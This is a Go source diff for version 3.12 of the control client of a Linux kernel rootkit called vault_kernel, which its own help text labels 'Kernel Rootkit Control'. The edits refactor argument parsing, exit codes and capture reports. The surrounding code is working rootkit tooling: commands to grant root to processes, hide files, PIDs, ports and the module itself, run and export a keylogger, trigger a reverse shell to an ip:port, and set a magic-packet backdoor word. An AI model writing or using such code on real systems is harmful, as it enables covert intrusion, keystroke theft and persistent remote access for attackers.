@@ -3,7 +3,9 @@ package main
 import (
 	"encoding/binary"
 	"encoding/json"
+	"errors"
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -16,7 +18,7 @@ import (
 	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
-const clientVersion = "3.11"
+const clientVersion = "3.12"
 
 // Poll interval contract of `keylog --follow` (milliseconds), mirrored
 // by KEYLOG_DEFAULT_INTERVAL_MS / KEYLOG_MIN_INTERVAL_MS in the Python CLI.
@@ -34,6 +36,31 @@ const devicePath = "/dev/vault_kernel"
 // sysfsModulePath is where the kernel exposes loaded modules; absence
 // (once stats work) means the module is hidden from lsmod/sysfs.
 const sysfsModulePath = "/sys/module/vault_kernel"
+
+// usageError marks a GRAMMAR/USAGE failure - missing or extra
+// operands, invalid values, violated flag preconditions, unknown
+// commands.  Since v3.12 the CLI exit contract is THREE classes wide
+// and identical in both clients (parity with argparse, which exits 2
+// for its own usage errors):
+//
+//	0  success
+//	1  runtime error (device open, ioctl failure, empty report,
+//	   unwritable output file)
+//	2  usage error (this type)
+//
+// main() maps the class to the exit code with errors.As; every error
+// that still reaches it as a plain error is runtime by construction.
+type usageError struct{ err error }
+
+func (e *usageError) Error() string { return e.err.Error() }
+func (e *usageError) Unwrap() error { return e.err }
+
+// usagef is the fmt.Errorf of the grammar layer: it wraps the message
+// in a *usageError so main() can tell usage failures (exit 2) from
+// runtime ones (exit 1).
+func usagef(format string, a ...interface{}) error {
+	return &usageError{err: fmt.Errorf(format, a...)}
+}
 
 func openDevice() (*os.File, error) {
 	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
@@ -83,11 +110,11 @@ func parseGiveRootPID(args []string) (int, error) {
 		return 0, nil
 	}
 	if len(args) > 1 {
-		return 0, fmt.Errorf("usage: vault_kernel give-root [pid]")
+		return 0, usagef("usage: vault_kernel give-root [pid]")
 	}
 	pid, err := strconv.Atoi(args[0])
 	if err != nil {
-		return 0, fmt.Errorf("invalid PID: %s (numeric PID, or none for self)", args[0])
+		return 0, usagef("invalid PID: %s (numeric PID, or none for self)", args[0])
 	}
 	return pid, nil
 }
@@ -99,10 +126,10 @@ func parseGiveRootPID(args []string) (int, error) {
 // rejects them).  `usage` is printed verbatim on mismatch.
 func strictArgs(args []string, want int, usage string) error {
 	if len(args) > want {
-		return fmt.Errorf("%s (unexpected argument: %s)", usage, args[want])
+		return usagef("%s (unexpected argument: %s)", usage, args[want])
 	}
 	if len(args) < want {
-		return fmt.Errorf("%s", usage)
+		return usagef("%s", usage)
 	}
 	return nil
 }
@@ -130,7 +157,7 @@ func posixOperandArgs(args []string) ([]string, error) {
 		return args[1:], nil
 	}
 	if len(args[0]) > 1 && strings.HasPrefix(args[0], "-") && !looksNegativeNumber(args[0]) {
-		return nil, fmt.Errorf("unknown option: %s (use '-- %s' to pass it as an operand)", args[0], args[0])
+		return nil, usagef("unknown option: %s (use '-- %s' to pass it as an operand)", args[0], args[0])
 	}
 	return args, nil
 }
@@ -147,6 +174,34 @@ func looksNegativeNumber(s string) bool {
 	return err == nil
 }
 
+// validateFileName is the pre-device value check of hide-file and
+// unhide-file (v3.12): empty names and names beyond the kernel's
+// 255-byte hide-list are USAGE errors (exit 2), reported without
+// opening the device -- the Python client rejects the same values via
+// _reject before opening too.  Pure.
+func validateFileName(name string) error {
+	if name == "" {
+		return usagef("file name cannot be empty")
+	}
+	if len(name) > 255 {
+		return usagef("name too long (%d bytes): the kernel hide-list stores at most 255", len(name))
+	}
+	return nil
+}
+
+// validateMagicWord is the pre-device value check of `magic` -- same
+// contract as validateFileName (the module stores at most 15 chars).
+// Pure.
+func validateMagicWord(word string) error {
+	if word == "" {
+		return usagef("magic word cannot be empty (an empty word disables the backdoor only via reset)")
+	}
+	if len(word) > 15 {
+		return usagef("magic word too long (%d chars): module stores at most 15", len(word))
+	}
+	return nil
+}
+
 // parseFlagOnly is the strict grammar of commands whose ONLY argument
 // is one optional flag (doctor/list/stats --json): no flag, the flag
 // once, or a usage error — anything else was silently ignored before
@@ -158,7 +213,7 @@ func parseFlagOnly(args []string, flag, usage string) (bool, error) {
 	if len(args) == 1 && args[0] == flag {
 		return true, nil
 	}
-	return false, fmt.Errorf("usage: %s", usage)
+	return false, usagef("usage: %s", usage)
 }
 
 // parsePIDArg validates a REQUIRED pid operand of hide-pid/unhide-pid:
@@ -169,10 +224,10 @@ func parseFlagOnly(args []string, flag, usage string) (bool, error) {
 func parsePIDArg(s string) (int, error) {
 	pid, err := strconv.Atoi(s)
 	if err != nil {
-		return 0, fmt.Errorf("invalid PID: %s (numeric, >= 1)", s)
+		return 0, usagef("invalid PID: %s (numeric, >= 1)", s)
 	}
 	if pid < 1 {
-		return 0, fmt.Errorf("invalid PID: %d (must be >= 1)", pid)
+		return 0, usagef("invalid PID: %d (must be >= 1)", pid)
 	}
 	return pid, nil
 }
@@ -184,7 +239,7 @@ func parsePIDArg(s string) (int, error) {
 func parsePortArg(s string) (uint16, error) {
 	p, err := strconv.Atoi(s)
 	if err != nil || p < 1 || p > 65535 {
-		return 0, fmt.Errorf("invalid port: %s", s)
+		return 0, usagef("invalid port: %s", s)
 	}
 	return uint16(p), nil
 }
@@ -199,22 +254,28 @@ func parsePortArg(s string) (uint16, error) {
 // clear client-side error instead.  Pure and unit-testable.
 func parseShellTarget(target string) error {
 	if target == "" {
-		return fmt.Errorf("usage: vault_kernel shell <ip:port>")
+		return usagef("usage: vault_kernel shell <ip:port>")
 	}
 	// Exactly ONE colon: the module splits at the FIRST colon, so
 	// anything with 2+ colons (IPv6 literals included, `a:b:44`)
 	// would reach it as a mangled host/port pair — rejected here
 	// with a clear client-side error instead.
 	if strings.Count(target, ":") != 1 {
-		return fmt.Errorf("invalid target %q: use ip:port (IPv6 not supported)", target)
+		return usagef("invalid target %q: use ip:port (IPv6 not supported)", target)
 	}
 	i := strings.Index(target, ":")
 	if i == 0 || i == len(target)-1 {
-		return fmt.Errorf("invalid target %q: empty host or port", target)
+		return usagef("invalid target %q: empty host or port", target)
+	}
+	// v3.12: the 255-byte kernel-buffer check moves UP from
+	// backdoorShell into the grammar (usage class, reported without
+	// touching the device; the Python _reject fires pre-open too).
+	if len(target) > 255 {
+		return usagef("target too long (%d bytes): kernel buffer stores at most 255", len(target))
 	}
 	port, err := strconv.Atoi(target[i+1:])
 	if err != nil || port < 1 || port > 65535 {
-		return fmt.Errorf("invalid port in target %q: %s", target, target[i+1:])
+		return usagef("invalid port in target %q: %s", target, target[i+1:])
 	}
 	return nil
 }
@@ -248,11 +309,10 @@ func giveRoot(f *os.File, pid int) error {
 }
 
 func hideFile(f *os.File, name string) error {
-	if name == "" {
-		return fmt.Errorf("file name cannot be empty")
-	}
-	if len(name) > 255 {
-		return fmt.Errorf("name too long (%d bytes): the kernel hide-list stores at most 255", len(name))
+	// v3.12: value validation lives in validateFileName (usage class,
+	// fired pre-device by the dispatcher); kept here as defense.
+	if err := validateFileName(name); err != nil {
+		return err
 	}
 	buf := make([]byte, 256)
 	copy(buf, name)
@@ -265,11 +325,9 @@ func hideFile(f *os.File, name string) error {
 }
 
 func unhideFile(f *os.File, name string) error {
-	if name == "" {
-		return fmt.Errorf("file name cannot be empty")
-	}
-	if len(name) > 255 {
-		return fmt.Errorf("name too long (%d bytes): the kernel hide-list stores at most 255", len(name))
+	// v3.12: same defense as hideFile.
+	if err := validateFileName(name); err != nil {
+		return err
 	}
 	buf := make([]byte, 256)
 	copy(buf, name)
@@ -422,23 +480,23 @@ func parseKeylogArgs(args []string) (keylogOpts, error) {
 			opts.timestamps = true
 		case "--stop-after":
 			if i+1 >= len(args) {
-				return opts, fmt.Errorf("--stop-after requires an N operand")
+				return opts, usagef("--stop-after requires an N operand")
 			}
 			if opts.stopAfter != 0 {
-				return opts, fmt.Errorf("--stop-after given more than once")
+				return opts, usagef("--stop-after given more than once")
 			}
 			i++
 			n, err := strconv.Atoi(args[i])
 			if err != nil || n < 1 {
-				return opts, fmt.Errorf("invalid --stop-after: %s (events, >= 1)", args[i])
+				return opts, usagef("invalid --stop-after: %s (events, >= 1)", args[i])
 			}
 			opts.stopAfter = n
 		case "--output":
 			if i+1 >= len(args) {
-				return opts, fmt.Errorf("--output requires a FILE operand")
+				return opts, usagef("--output requires a FILE operand")
 			}
 			if opts.outputPath != "" {
-				return opts, fmt.Errorf("--output given more than once")
+				return opts, usagef("--output given more than once")
 			}
 			i++
 			opts.outputPath = args[i]
@@ -447,25 +505,25 @@ func parseKeylogArgs(args []string) (keylogOpts, error) {
 				// file called "--follow" (parity with argparse, which
 				// rejects the same input with "expected one argument").
 				// A real path starting with '-' needs the ./- escape.
-				return opts, fmt.Errorf("--output requires a FILE operand (got %q; paths starting with '-' need a ./ prefix)", opts.outputPath)
+				return opts, usagef("--output requires a FILE operand (got %q; paths starting with '-' need a ./ prefix)", opts.outputPath)
 			}
 		default:
 			if !opts.follow || seenInterval {
-				return opts, fmt.Errorf("usage: vault_kernel keylog [--follow [ms]] [--timestamps] [--output FILE] [--stop-after N]")
+				return opts, usagef("usage: vault_kernel keylog [--follow [ms]] [--timestamps] [--output FILE] [--stop-after N]")
 			}
 			n, err := strconv.Atoi(args[i])
 			if err != nil || n < keylogMinIntervalMs {
-				return opts, fmt.Errorf("invalid interval: %s (milliseconds, min %d)", args[i], keylogMinIntervalMs)
+				return opts, usagef("invalid interval: %s (milliseconds, min %d)", args[i], keylogMinIntervalMs)
 			}
 			opts.intervalMs = n
 			seenInterval = true
 		}
 	}
 	if opts.timestamps && !opts.follow {
-		return opts, fmt.Errorf("--timestamps requires --follow")
+		return opts, usagef("--timestamps requires --follow")
 	}
 	if opts.stopAfter != 0 && !opts.follow {
-		return opts, fmt.Errorf("--stop-after requires --follow")
+		return opts, usagef("--stop-after requires --follow")
 	}
 	return opts, nil
 }
@@ -491,25 +549,25 @@ func parseCaptureArgs(args []string) (string, bool, error) {
 		switch args[i] {
 		case "--out":
 			if i+1 >= len(args) {
-				return "", false, fmt.Errorf("--out requires a FILE operand")
+				return "", false, usagef("--out requires a FILE operand")
 			}
 			if outPath != "" {
-				return "", false, fmt.Errorf("--out given more than once")
+				return "", false, usagef("--out given more than once")
 			}
 			i++
 			outPath = args[i]
 			if outPath == "" || strings.HasPrefix(outPath, "-") {
 				// v3.10: same flag-value rule as --output — `capture
 				// --out --json` used to eat --json as the path.
-				return "", false, fmt.Errorf("--out requires a FILE operand (got %q; paths starting with '-' need a ./ prefix)", outPath)
+				return "", false, usagef("--out requires a FILE operand (got %q; paths starting with '-' need a ./ prefix)", outPath)
 			}
 		case "--stdout":
 			if forceStdout {
-				return "", false, fmt.Errorf("--stdout given more than once")
+				return "", false, usagef("--stdout given more than once")
 			}
 			forceStdout = true
 		default:
-			return "", false, fmt.Errorf("usage: vault_kernel capture [--out FILE] [--stdout]")
+			return "", false, usagef("usage: vault_kernel capture [--out FILE] [--stdout]")
 		}
 	}
 	return outPath, forceStdout, nil
@@ -680,7 +738,7 @@ func runWatch(f *os.File, opts watchOpts) error {
 	statsBuf := make([]byte, 4096)
 	listBuf := make([]byte, 4096)
 	var prevStats map[string]string
-	for {
+	for frame := 1; ; frame++ {
 		stats, panel, err := watchFrame(f, statsBuf, listBuf, prevStats, opts.intervalMs)
 		if err != nil {
 			return err
@@ -689,6 +747,14 @@ func runWatch(f *os.File, opts watchOpts) error {
 		fmt.Print("\x1b[2J\x1b[H")
 		fmt.Print(panel)
 		prevStats = stats
+
+		// v3.12: --count N ends the stream after the Nth frame with
+		// the SAME farewell as the signals — finite watch windows for
+		// lab reports (symmetric with keylog --stop-after).
+		if opts.count > 0 && frame >= opts.count {
+			fmt.Println("[*] watch stopped")
+			return nil
+		}
 
 		select {
 		case <-sig:
@@ -745,8 +811,10 @@ func keylogClear(f *os.File) error {
 }
 
 func backdoorShell(f *os.File, target string) error {
+	// v3.12: the length check moved up to parseShellTarget; kept as
+	// defense in depth.
 	if len(target) > 255 {
-		return fmt.Errorf("target too long (%d bytes): kernel buffer stores at most 255", len(target))
+		return usagef("target too long (%d bytes): kernel buffer stores at most 255", len(target))
 	}
 	buf := make([]byte, 256)
 	copy(buf, target)
@@ -759,11 +827,10 @@ func backdoorShell(f *os.File, target string) error {
 }
 
 func backdoorMagic(f *os.File, word string) error {
-	if word == "" {
-		return fmt.Errorf("magic word cannot be empty (an empty word disables the backdoor only via reset)")
-	}
-	if len(word) > 15 {
-		return fmt.Errorf("magic word too long (%d chars): module stores at most 15", len(word))
+	// v3.12: value validation lives in validateMagicWord (usage class,
+	// fired pre-device by the dispatcher); kept here as defense.
+	if err := validateMagicWord(word); err != nil {
+		return err
 	}
 	buf := make([]byte, 16)
 	copy(buf, word)
@@ -881,6 +948,8 @@ type captureReport struct {
 	Schema        int                    `json:"schema"`
 	CapturedAt    string                 `json:"captured_at"`
 	ClientVersion string                 `json:"client_version"`
+	Hostname      string                 `json:"hostname"`
+	KernelRelease string                 `json:"kernel_release"`
 	ModuleInSysfs bool                   `json:"module_in_sysfs"`
 	Stats         map[string]interface{} `json:"stats"`
 	Hidden        ioctl.HiddenList       `json:"hidden"`
@@ -891,18 +960,34 @@ type captureReport struct {
 // inputs — pure, so the envelope is unit-testable without a device
 // (v3.9). Callers own the ioctls and the timestamp: capturedAt is the
 // UTC RFC3339 instant of the SNAPSHOT, taken after the buffers were
-// read.
-func buildCaptureReport(statsRaw map[string]string, hidden ioctl.HiddenList, keylogText, capturedAt string, moduleInSysfs bool, clientVer string) captureReport {
+// read.  v3.12 adds the host context (hostname, kernel_release —
+// WHERE a snapshot was taken, the first question of any lab reviewer);
+// both fields are ADDITIVE so the schema envelope stays at 1.
+func buildCaptureReport(statsRaw map[string]string, hidden ioctl.HiddenList, keylogText, capturedAt string, moduleInSysfs bool, clientVer, hostname, kernelRelease string) captureReport {
 	stats := statsMap(statsRaw)
 	return captureReport{
 		Schema:        jsonSchemaVersion,
 		CapturedAt:    capturedAt,
 		ClientVersion: clientVer,
+		Hostname:      hostname,
+		KernelRelease: kernelRelease,
 		ModuleInSysfs: moduleInSysfs,
 		Stats:         stats,
 		Hidden:        hidden,
 		Keylog:        keylogText,
 	}
+}
+
+// runningKernelRelease returns the running kernel release (the
+// `uname -r` equivalent) from procfs — an evidence bundle records
+// WHERE a snapshot was taken.  "" when procfs is unavailable (never
+// expected on Linux, but a missing label must not fail the capture).
+func runningKernelRelease() string {
+	b, err := os.ReadFile("/proc/sys/kernel/osrelease")
+	if err != nil {
+		return ""
+	}
+	return strings.TrimSpace(string(b))
 }
 
 // runCapture reads stats, the hidden list and the keylog buffer in one
@@ -926,6 +1011,7 @@ func runCapture(f *os.File, outPath string, forceStdout bool) error {
 	}
 
 	_, sysfsErr := os.Stat(sysfsModulePath)
+	hostname, _ := os.Hostname()
 	rep := buildCaptureReport(
 		ioctl.ParseStatsReport(strings.TrimRight(string(statsBuf), "\x00")),
 		ioctl.ParseHiddenList(strings.TrimRight(string(listBuf), "\x00")),
@@ -933,6 +1019,8 @@ func runCapture(f *os.File, outPath string, forceStdout bool) error {
 		time.Now().UTC().Format(time.RFC3339),
 		sysfsErr == nil,
 		clientVersion,
+		hostname,
+		runningKernelRelease(),
 	)
 	j, err := json.MarshalIndent(rep, "", "  ")
 	if err != nil {
@@ -1314,36 +1402,58 @@ func parsePortArgs(args []string, cmd string) (uint16, error) {
 type watchOpts struct {
 	intervalMs int
 	once       bool
+	count      int // v3.12: stop after N frames (0 = unlimited)
 }
 
-// parseWatchArgs owns the `watch` grammar (v3.9, extended in v3.10
-// with --once; pure):
+// parseWatchArgs owns the `watch` grammar (v3.9; --once in v3.10;
+// --count in v3.12; pure):
 //
-//	watch [--interval MS] [--once]
+//	watch [--interval MS] [--once] [--count N]
 //
 // Default 1000 ms, --interval takes a required operand (>= 50 ms,
 // same floor as keylog), and ANY extra argument is a usage error —
 // `watch --interval 500 extra` used to ignore "extra" in silence.
 // --once renders a single frame and exits (no ANSI control, no loop).
+// v3.12 adds --count N (>= 1, at most once): the loop renders N frames
+// and exits with the standard farewell — finite watch windows for lab
+// reports and CI diagnostics, symmetric with keylog --stop-after.
+// --once and --count are mutually exclusive (a usage error): one frame
+// is not a window.
 func parseWatchArgs(args []string) (watchOpts, error) {
 	opts := watchOpts{intervalMs: watchDefaultIntervalMs}
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
 		case "--once":
 			opts.once = true
+		case "--count":
+			if i+1 >= len(args) {
+				return opts, usagef("--count requires an N operand")
+			}
+			if opts.count != 0 {
+				return opts, usagef("--count given more than once")
+			}
+			i++
+			n, err := strconv.Atoi(args[i])
+			if err != nil || n < 1 {
+				return opts, usagef("invalid --count: %s (frames, >= 1)", args[i])
+			}
+			opts.count = n
 		case "--interval":
 			if i+1 >= len(args) {
-				return opts, fmt.Errorf("--interval requires an MS operand")
+				return opts, usagef("--interval requires an MS operand")
 			}
 			i++
 			n, err := strconv.Atoi(args[i])
 			if err != nil || n < keylogMinIntervalMs {
-				return opts, fmt.Errorf("invalid interval: %s (milliseconds, min %d)", args[i], keylogMinIntervalMs)
+				return opts, usagef("invalid interval: %s (milliseconds, min %d)", args[i], keylogMinIntervalMs)
 			}
 			opts.intervalMs = n
 		default:
-			return opts, fmt.Errorf("usage: vault_kernel watch [--interval MS] [--once]")
+			return opts, usagef("usage: vault_kernel watch [--interval MS] [--once] [--count N]")
 		}
+	}
+	if opts.once && opts.count != 0 {
+		return opts, usagef("--once and --count are mutually exclusive")
 	}
 	return opts, nil
 }
@@ -1354,7 +1464,7 @@ func parseWatchArgs(args []string) (watchOpts, error) {
 // device; it lives before openDevice in the dispatcher).
 func parseMagicEncodeArgs(args []string) (string, uint16, error) {
 	if len(args) != 2 {
-		return "", 0, fmt.Errorf("usage: vault_kernel magic-encode <word> <port>")
+		return "", 0, usagef("usage: vault_kernel magic-encode <word> <port>")
 	}
 	port, err := parsePortArg(args[1])
 	if err != nil {
@@ -1369,7 +1479,13 @@ func printVersion() {
 }
 
 func printUsage() {
-	fmt.Print(`vault_kernel CLI — Kernel Rootkit Control
+	printUsageTo(os.Stdout)
+}
+
+// printUsageTo writes the command surface to any writer — stdout for
+// `help`, stderr for the bare-invocation usage error (v3.12).
+func printUsageTo(w io.Writer) {
+	fmt.Fprint(w, `vault_kernel CLI — Kernel Rootkit Control
 
 Usage:
   vault_kernel <command> [arguments]
@@ -1387,9 +1503,10 @@ Commands:
   list [--json]           List all hidden items
   stats                   Show module stats (version, hooks, counts)
   stats --json            Same, as machine-readable JSON
-  watch [--interval MS] [--once]
+  watch [--interval MS] [--once] [--count N]
                           Live view of stats + hidden list (default 1000 ms);
-                          --once renders a single frame and exits
+                          --once renders a single frame and exits;
+                          --count N renders N frames and exits
   shell <ip:port>         Trigger reverse shell
   magic <word>            Set magic packet trigger word
   magic-encode <word> <port>  Print the kill() trigger for a word+port
@@ -1405,15 +1522,15 @@ Commands:
   unhide-module           Make rootkit visible in lsmod
   reset                   Clear ALL hidden files, PIDs and ports
   version                 Print client version
+
+Exit codes:
+  0  success
+  1  runtime error (device open, ioctl failure, empty report)
+  2  usage error (grammar, invalid values, unknown command)
 `)
 }
 
 func run() error {
-	if len(os.Args) < 2 {
-		printUsage()
-		return nil
-	}
-
 	if os.Args[1] == "status" {
 		// v3.10: --json joins the machine-readable surface (5th JSON
 		// document); the strict grammar is kept via parseFlagOnly.
@@ -1439,7 +1556,7 @@ func run() error {
 	}
 
 	if os.Args[1] == "doctor" {
-		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "vault_kernel doctor [--json]")
+		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "usage: vault_kernel doctor [--json]")
 		if err != nil {
 			return err
 		}
@@ -1461,13 +1578,18 @@ func run() error {
 		return magicEncode(word, port)
 	}
 
-	f, err := openDevice()
-	if err != nil {
-		return err
-	}
-	defer f.Close()
-
 	cmd := os.Args[1]
+
+	// v3.12: GRAMMAR BEFORE DEVICE.  Every device case parses its
+	// arguments with the pure parsers and returns the execution
+	// closure; openDevice runs ONCE after the switch.  A usage error
+	// (exit 2) is therefore reported without touching the device —
+	// the round-4 post-opening grammar hid it behind the device error
+	// whenever the module was not loaded (`hide-file a b` without the
+	// module reported "cannot open /dev/vault_kernel" instead of the
+	// unexpected operand).  With the module loaded the behaviour is
+	// identical to v3.11.
+	var exec func(f *os.File) error
 
 	switch cmd {
 	case "give-root":
@@ -1480,13 +1602,14 @@ func run() error {
 		if err != nil {
 			return err
 		}
-		return giveRoot(f, pid)
+		exec = func(f *os.File) error { return giveRoot(f, pid) }
 
 	case "hide-file":
 		// v3.9 strict grammar: `hide-file a b` used to hide "a" and
 		// silently drop "b".  v3.11: POSIX escape for dash-leading
 		// names (`hide-file -- -foo`), bare "-foo" rejected like
-		// argparse.
+		// argparse.  v3.12: value validation (empty / >255 bytes) in
+		// the pre-device grammar via validateFileName.
 		rest, err := posixOperandArgs(os.Args[2:])
 		if err != nil {
 			return err
@@ -1494,7 +1617,11 @@ func run() error {
 		if err := strictArgs(rest, 1, "usage: vault_kernel hide-file <name>"); err != nil {
 			return err
 		}
-		return hideFile(f, rest[0])
+		if err := validateFileName(rest[0]); err != nil {
+			return err
+		}
+		name := rest[0]
+		exec = func(f *os.File) error { return hideFile(f, name) }
 
 	case "unhide-file":
 		rest, err := posixOperandArgs(os.Args[2:])
@@ -1504,7 +1631,11 @@ func run() error {
 		if err := strictArgs(rest, 1, "usage: vault_kernel unhide-file <name>"); err != nil {
 			return err
 		}
-		return unhideFile(f, rest[0])
+		if err := validateFileName(rest[0]); err != nil {
+			return err
+		}
+		name := rest[0]
+		exec = func(f *os.File) error { return unhideFile(f, name) }
 
 	case "hide-pid":
 		// v3.9: pid >= 1 (the module stores any int verbatim; a
@@ -1514,57 +1645,59 @@ func run() error {
 		if err != nil {
 			return err
 		}
-		return hidePID(f, pid)
+		exec = func(f *os.File) error { return hidePID(f, pid) }
 
 	case "unhide-pid":
 		pid, err := parsePIDArgs(os.Args[2:], "unhide-pid")
 		if err != nil {
 			return err
 		}
-		return unhidePID(f, pid)
+		exec = func(f *os.File) error { return unhidePID(f, pid) }
 
 	case "hide-port":
 		port, err := parsePortArgs(os.Args[2:], "hide-port")
 		if err != nil {
 			return err
 		}
-		return hidePort(f, port)
+		exec = func(f *os.File) error { return hidePort(f, port) }
 
 	case "unhide-port":
 		port, err := parsePortArgs(os.Args[2:], "unhide-port")
 		if err != nil {
 			return err
 		}
-		return unhidePort(f, port)
+		exec = func(f *os.File) error { return unhidePort(f, port) }
 
 	case "list":
-		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "vault_kernel list [--json]")
+		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "usage: vault_kernel list [--json]")
 		if err != nil {
 			return err
 		}
 		if jsonMode {
-			return listHiddenJSON(f)
+			exec = func(f *os.File) error { return listHiddenJSON(f) }
+		} else {
+			exec = func(f *os.File) error { return listHidden(f) }
 		}
-		return listHidden(f)
 
 	case "stats":
-		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "vault_kernel stats [--json]")
+		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "usage: vault_kernel stats [--json]")
 		if err != nil {
 			return err
 		}
 		if jsonMode {
-			return showStatsJSON(f)
+			exec = func(f *os.File) error { return showStatsJSON(f) }
+		} else {
+			exec = func(f *os.File) error { return showStats(f) }
 		}
-		return showStats(f)
 
 	case "watch":
 		// v3.9: grammar extracted to a pure parser — `watch --interval
-		// 500 extra` used to ignore "extra" in silence.
+		// 500 extra` used to ignore "extra" in silence.  v3.12: --count.
 		opts, err := parseWatchArgs(os.Args[2:])
 		if err != nil {
 			return err
 		}
-		return runWatch(f, opts)
+		exec = func(f *os.File) error { return runWatch(f, opts) }
 
 	case "shell":
 		// v3.9: real ip:port validation (host non-empty, port 1-65535)
@@ -1580,10 +1713,12 @@ func run() error {
 		if err := parseShellTarget(rest[0]); err != nil {
 			return err
 		}
-		return backdoorShell(f, rest[0])
+		target := rest[0]
+		exec = func(f *os.File) error { return backdoorShell(f, target) }
 
 	case "magic":
-		// v3.11: POSIX end-of-options like argparse.
+		// v3.11: POSIX end-of-options like argparse.  v3.12: value
+		// validation via validateMagicWord pre-device.
 		rest, err := posixOperandArgs(os.Args[2:])
 		if err != nil {
 			return err
@@ -1591,7 +1726,11 @@ func run() error {
 		if err := strictArgs(rest, 1, "usage: vault_kernel magic <word>"); err != nil {
 			return err
 		}
-		return backdoorMagic(f, rest[0])
+		if err := validateMagicWord(rest[0]); err != nil {
+			return err
+		}
+		word := rest[0]
+		exec = func(f *os.File) error { return backdoorMagic(f, word) }
 
 	case "keylog":
 		opts, err := parseKeylogArgs(os.Args[2:])
@@ -1599,44 +1738,54 @@ func run() error {
 			return err
 		}
 		if opts.follow {
-			return keylogFollow(f, opts.intervalMs, opts.timestamps, opts.outputPath, opts.stopAfter)
+			exec = func(f *os.File) error {
+				return keylogFollow(f, opts.intervalMs, opts.timestamps, opts.outputPath, opts.stopAfter)
+			}
+		} else {
+			exec = func(f *os.File) error { return keylogRead(f, opts.outputPath) }
 		}
-		return keylogRead(f, opts.outputPath)
 
 	case "capture":
 		outPath, forceStdout, err := parseCaptureArgs(os.Args[2:])
 		if err != nil {
 			return err
 		}
-		return runCapture(f, outPath, forceStdout)
+		exec = func(f *os.File) error { return runCapture(f, outPath, forceStdout) }
 
 	case "keylog-clear":
 		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel keylog-clear"); err != nil {
 			return err
 		}
-		return keylogClear(f)
+		exec = func(f *os.File) error { return keylogClear(f) }
 
 	case "hide-module":
 		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel hide-module"); err != nil {
 			return err
 		}
-		return hideModule(f)
+		exec = func(f *os.File) error { return hideModule(f) }
 
 	case "unhide-module":
 		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel unhide-module"); err != nil {
 			return err
 		}
-		return unhideModule(f)
+		exec = func(f *os.File) error { return unhideModule(f) }
 
 	case "reset":
 		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel reset"); err != nil {
 			return err
 		}
-		return resetAll(f)
+		exec = func(f *os.File) error { return resetAll(f) }
 
 	default:
-		return fmt.Errorf("unknown command: %s\nRun 'vault_kernel help' for usage", cmd)
+		return usagef("unknown command: %s\nRun 'vault_kernel help' for usage", cmd)
 	}
+
+	f, err := openDevice()
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	return exec(f)
 }
 
 // deviceRequired reports whether a command opens /dev/vault_kernel.
@@ -1656,11 +1805,25 @@ func deviceRequired(cmd string) bool {
 }
 
 func main() {
-	if len(os.Args) > 1 && deviceRequired(os.Args[1]) && os.Geteuid() != 0 {
+	if len(os.Args) < 2 {
+		// v3.12: a bare invocation is a USAGE error, not help — the
+		// exit contract is 0 = success, 1 = runtime, 2 = usage (parity
+		// with the Python client and with argparse's missing
+		// subcommand behaviour).  The usage goes to stderr.
+		printUsageTo(os.Stderr)
+		os.Exit(2)
+	}
+	if deviceRequired(os.Args[1]) && os.Geteuid() != 0 {
 		fmt.Fprintln(os.Stderr, "[!] Warning: not running as root. Some commands may fail.")
 	}
-	if err := run(); err != nil {
-		fmt.Fprintf(os.Stderr, "[-] Error: %v\n", err)
-		os.Exit(1)
+	err := run()
+	if err == nil {
+		return
 	}
+	var ue *usageError
+	fmt.Fprintf(os.Stderr, "[-] Error: %v\n", err)
+	if errors.As(err, &ue) {
+		os.Exit(2)
+	}
+	os.Exit(1)
 }
